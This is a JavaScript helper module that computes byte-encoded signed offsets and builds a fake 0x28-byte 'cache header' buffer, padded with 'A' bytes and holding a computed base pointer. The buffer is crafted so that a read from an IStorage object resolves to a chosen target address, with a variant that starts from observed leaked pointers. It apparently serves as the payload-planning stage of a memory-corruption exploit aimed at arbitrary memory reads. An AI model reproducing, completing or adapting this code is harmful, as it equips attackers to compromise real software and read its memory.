// Pure signed-cache-header and address-plan calculations.
// Depends on: core/analysis/bytes.js (AnalysisBytes).
// API: CachePlan. These helpers build plans only; they perform no IPC or reads.

var CachePlan = (function() {
    var DEFAULTS = {
        controlSize: 0x4000,
        range: 0x7E7E7E7E7E7E7E7En,
        supportedCycles: [0x28000, 0x500000],
        withinOffsets: [0, 0x40, 0x140, 0x200],
        minimumTarget: 0x100000000,
        maximumTargetExclusive: 2 ** 39,
        encodingTimeoutMs: 5000,
        lowerWindowMaxPrefix: 0x4000000,
        lowerWindowStorageReserve: 0x8000
    };

    function settings(options) {
        var out = {};
        var key;
        for (key in DEFAULTS) out[key] = DEFAULTS[key];
        if (options) {
            for (key in options)
                if (Object.prototype.hasOwnProperty.call(options, key))
                    out[key] = options[key];
        }
        return out;
    }

    function encodeSignedCacheOffset(bias, bucketCount, deadline, options) {
        var opts = settings(options);
        var blockSize = opts.controlSize;
        if (!Number.isSafeInteger(bias) || bias < 0 ||
            bias >= opts.maximumTargetExclusive ||
            !Number.isSafeInteger(bucketCount) || bucketCount <= 0) return null;
        if (deadline === undefined || deadline === null)
            deadline = Date.now() + opts.encodingTimeoutMs;

        var odd = bucketCount, power = 0;
        while (odd % 2 === 0) { odd /= 2; power++; }
        var zeroBits = (2 ** power - 1) * blockSize;
        var displacement = [];
        var word = BigInt(bias);
        for (var i = 0; i < 8; i++) {
            displacement.push(Number(word & 0xFFn));
            word >>= 8n;
        }
        var wanted = Number((1n << 50n) % BigInt(odd));
        var misses = Object.create(null);
        var visits = 0;

        function choose(position, leftState, rightState, carry, remainder) {
            visits++;
            if ((visits & 4095) === 0 && Date.now() > deadline)
                throw new Error("No signed cache encoding found within " +
                    opts.encodingTimeoutMs + " ms");
            if (position === 8)
                return !leftState[0] && !rightState[0] && remainder === wanted
                    ? [] : null;

            var key = [position, leftState.join(":"),
                rightState.join(":"), carry, remainder].join(",");
            if (misses[key]) return null;
            var first = 1;
            if (position === 6) {
                first = 0xC2;
            } else if (position === 7) {
                first = 0x81;
            }

            var last = position >= 6 ? first : 0xF4;
            var mask = Math.floor(zeroBits / (2 ** (position * 8))) & 0xFF;
            for (var left = first; left <= last; left++) {
                if (left === 0 || left === 0x2F || left === 0x5C ||
                    (left & mask)) continue;
                var total = left + displacement[position] + carry;
                var right = total & 0xFF;
                if (right === 0 || right === 0x2F || right === 0x5C) continue;
                var nextLeft = AnalysisBytes.utf8Step(leftState, left);
                var nextRight = AnalysisBytes.utf8Step(rightState, right);
                if (!nextLeft || !nextRight) continue;

                var contribution = 0;
                if (position === 1) contribution = left >> 6;
                else if (position >= 2)
                    contribution = left *
                        ((2 ** (position * 8 - 14)) % odd);
                var suffix = choose(position + 1, nextLeft, nextRight,
                    total >> 8, (remainder + contribution) % odd);
                if (suffix) return [left].concat(suffix);
            }
            misses[key] = true;
            return null;
        }

        var encoded = choose(0, [0, 0, 0], [0, 0, 0], 0, 0);
        if (!encoded) return null;
        var raw = AnalysisBytes.readU64LE(encoded, 0);
        return {offset: BigInt.asIntN(64, raw), bytes: encoded};
    }

    function buildSignedCachePlan(target, storageSize, cycle, options) {
        var opts = settings(options);
        var block = opts.controlSize;
        var deadline = Date.now() + opts.encodingTimeoutMs;
        cycle = cycle || opts.supportedCycles[0];

        if (!Number.isSafeInteger(target) || target < opts.minimumTarget ||
            target >= opts.maximumTargetExclusive)
            throw new Error("Target is outside the configured address width");
        if (!Number.isSafeInteger(storageSize) || storageSize < block)
            throw new Error("IStorage size is invalid");
        if (opts.supportedCycles.indexOf(cycle) < 0 || cycle % block !== 0)
            throw new Error("Unsupported cache bucket period");

        var bucketCount = cycle / block;
        for (var start = 0; start + block <= storageSize; start += cycle) {
            for (var wi = 0; wi < opts.withinOffsets.length; wi++) {
                var readOffset = start + opts.withinOffsets[wi];
                if (readOffset + block > storageSize) continue;
                var addressBias = target - readOffset;
                var encoded = encodeSignedCacheOffset(addressBias,
                    bucketCount, deadline, opts);
                if (!encoded) continue;

                var bytes = new Array(0x28);
                for (var bi = 0; bi < bytes.length; bi++) bytes[bi] = 0x41;
                for (var oi = 0; oi < 8; oi++) bytes[oi] = encoded.bytes[oi];
                AnalysisBytes.writeU64LE(bytes, 8, opts.range);
                for (var fi = 0x10; fi < 0x14; fi++) bytes[fi] = 1;
                var base = BigInt.asUintN(64,
                    encoded.offset + BigInt(addressBias));
                AnalysisBytes.writeU64LE(bytes, 0x20, base);

                var offset = encoded.offset;
                var bucketRemainder = (offset >> 14n) % BigInt(bucketCount);
                if (bytes.length !== 0x28 || offset >= 0n ||
                    bucketRemainder !== 0n ||
                    Math.floor(readOffset / block) % bucketCount !== 0 ||
                    readOffset + block > storageSize ||
                    BigInt(readOffset + block) > offset + opts.range ||
                    offset + opts.range >= (1n << 63n) ||
                    BigInt.asUintN(64, base + BigInt(readOffset) - offset) !==
                        BigInt(target)) {
                    throw new Error("Signed cache plan failed arithmetic checks");
                }

                return {target: target, storageSize: storageSize,
                    readOffset: readOffset, addressBias: addressBias,
                    cycle: cycle, offset: offset, base: base, bytes: bytes};
            }
        }
        throw new Error("No signed cache encoding fits measured IStorage");
    }

    function buildLowerWindowPlan(target, storageSize, cycle, pointers,
        options) {
        var opts = settings(options);
        var block = opts.controlSize;
        cycle = cycle || opts.supportedCycles[0];
        if (!Number.isSafeInteger(cycle) || cycle <= 0 || cycle % block !== 0)
            throw new Error("Unsupported cache bucket period");
        if (!pointers || pointers.length === 0)
            throw new Error("Lower-window plan needs an observed pointer");
        for (var i = 0; i < pointers.length; i++) {
            if (!Number.isSafeInteger(pointers[i]) ||
                pointers[i] < opts.minimumTarget ||
                pointers[i] >= opts.maximumTargetExclusive ||
                pointers[i] % block !== 0) {
                throw new Error("Observed pointer is not a qualified cache-block address");
            }
        }

        var low = Math.min.apply(null, pointers);
        var maximumPrefix = Math.min(opts.lowerWindowMaxPrefix,
            storageSize - opts.lowerWindowStorageReserve,
            target - opts.minimumTarget);
        var prefix = Math.floor(maximumPrefix / cycle) * cycle;
        if (prefix <= 0)
            throw new Error("No lower-window prefix fits measured IStorage");

        var plan = buildSignedCachePlan(target - prefix, storageSize,
            cycle, opts);
        plan.target = target;
        plan.readOffset += prefix;
        plan.lowerWindow = {
            lowestObservedPointer: low,
            proposedStart: target - prefix,
            prefix: prefix,
            qualification: "lower mapping remains unverified"
        };

        if (plan.addressBias + plan.readOffset !== target ||
            Math.floor(plan.readOffset / block) * block % cycle !== 0 ||
            plan.readOffset + block > storageSize ||
            BigInt.asUintN(64, plan.base + BigInt(plan.readOffset) -
                plan.offset) !== BigInt(target)) {
            throw new Error("Lower-window plan failed arithmetic checks");
        }
        return plan;
    }

    return {
        encodeSignedCacheOffset: encodeSignedCacheOffset,
        buildSignedCachePlan: buildSignedCachePlan,
        buildLowerWindowPlan: buildLowerWindowPlan
    };
})();
